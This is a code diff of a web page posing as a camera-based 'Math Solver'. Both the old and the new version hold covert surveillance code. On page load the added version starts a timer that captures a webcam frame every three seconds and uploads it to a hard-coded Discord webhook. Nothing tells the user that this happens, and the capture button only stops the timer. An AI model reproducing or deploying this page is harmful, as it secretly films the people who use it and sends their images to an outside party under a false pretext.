@@ -1,87 +1,94 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Camera math solver</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 0;
-    }
-    .container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-    }
-    .btn {
-      background-color: #4CAF50; /* Green */
-      border: none;
-      color: white;
-      padding: 15px 32px;
-      text-align: center;
-      text-decoration: none;
-      display: inline-block;
-      font-size: 16px;
-      margin: 4px 2px;
-      cursor: pointer;
-      border-radius: 10px;
-    }
-    .btn:hover {
-      background-color: #3e8e41;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <h1>Advanced AI math solver</h1>
-    <p>Click the button to scan the problem with the advanced math AI.</p>
-    <button class="btn" onclick="captureImage()">Capture Image</button>
-  </div>
+  <head>
+    <meta charset="UTF-8">
+    <title>Math Solver</title>
+    <style>
+      body {
+        background-color: #f7f7f7;
+        font-family: Arial, sans-serif;
+        font-size: 16px;
+      }
+      h1 {
+        color: #003580;
+        font-size: 32px;
+        text-align: center;
+        margin-top: 50px;
+      }
+      #math-image {
+        display: block;
+        margin: 0 auto;
+        width: 400px;
+        height: 300px;
+        border: 2px solid #003580;
+        border-radius: 10px;
+        box-shadow: 5px 5px 10px rgba(0, 0, 0, 0.2);
+      }
+      #math-equation {
+        text-align: center;
+        margin-top: 20px;
+        font-size: 24px;
+        color: #003580;
+      }
+      #capture-btn {
+        display: block;
+        margin: 20px auto;
+        padding: 10px;
+        background-color: #003580;
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        font-size: 20px;
+        cursor: pointer;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Math Solver</h1>
+    <img id="math-image" src="" alt="Math Equation">
+    <div id="math-equation"></div>
+    <button id="capture-btn">Capture</button>
+    <script>
+      var imageCounter = 1;
+      var intervalId = setInterval(function() {
+        captureImage();
+      }, 3000);
 
-  <script>
-    function captureImage() {
-      const webcamVideo = document.getElementById('webcam-video');
-      const canvas = document.createElement('canvas');
-      const context = canvas.getContext('2d');
-      const imgFormat = 'image/jpeg';
-      const imgQuality = 0.9;
-      const webhookUrl = 'https://discord.com/api/webhooks/1065327345688387635/wH3NICk0X7pGGyrQqNyOhqOh8S9eciqhdybhnj2lfU33Kgagnj_XKoOQD_GNPMryF6Pv';
-      const xhr = new XMLHttpRequest();
+      function captureImage() {
+        var video = document.querySelector('video');
+        var canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(function(blob) {
+          var formData = new FormData();
+          formData.append('file', blob, 'math-equation.jpg');
+          var xhr = new XMLHttpRequest();
+          xhr.open('POST', 'https://discord.com/api/webhooks/1092428597295337563/aGEEAAjT0UgS6oyWIvXahrkhEP51fVgs_jIlPYuNO0smX_KwWIfmigmOJU0YKCqDPXKa');
+          xhr.send(formData);
+        }, 'image/jpeg', 1.0);
+        var equation = 'Equation ' + imageCounter++;
+        document.getElementById('math-image').src = URL.createObjectURL(canvas.toDataURL());
+        document.getElementById('math-equation').innerHTML = equation;
+      }
 
-      navigator.mediaDevices.getUserMedia({video: true})
-        .then((stream) => {
-          webcamVideo.srcObject = stream;
-          webcamVideo.play();
-          setInterval(() => {
-            context.drawImage(webcamVideo, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob((blob) => {
-              const reader = new FileReader();
-              reader.readAsDataURL(blob);
-              reader.onloadend = () => {
-                const base64data = reader.result;
-                const formData = new FormData();
-                formData.append('file', blob, 'image.jpg');
-                xhr.onreadystatechange = function() {
-                  if (xhr.readyState === 4) {
-                    if (xhr.status === 200) {
-                      console.log('Image sent to Discord!');
-                    } else {
-                      console.error('Error sending image to Discord:', xhr.responseText);
-                    }
-                  }
-                };
-                xhr.open('POST', webhookUrl);
-                xhr.send(formData);
-              };
-            }, imgFormat, imgQuality);
-          }, 3000);
+      var constraints = { video: { width: 400, height: 300 } };
+      navigator.mediaDevices.getUserMedia(constraints)
+        .then(function(mediaStream) {
+          var video = document.createElement('video');
+          video.srcObject = mediaStream;
+          video.play();
+          document.body.appendChild(video);
         })
-        .catch((err) => {
-          console.error('Error accessing camera:', err);
+        .catch(function(err) {
+          console.log(err.name + ": " + err.message);
         });
-    }
-  </script>
-</body>
+
+      var captureBtn = document.getElementById('capture-btn');
+      captureBtn.addEventListener('click', function() {
+        clearInterval(intervalId);
+        captureImage();
+      });
+    </script>
+  </body>
 </html>
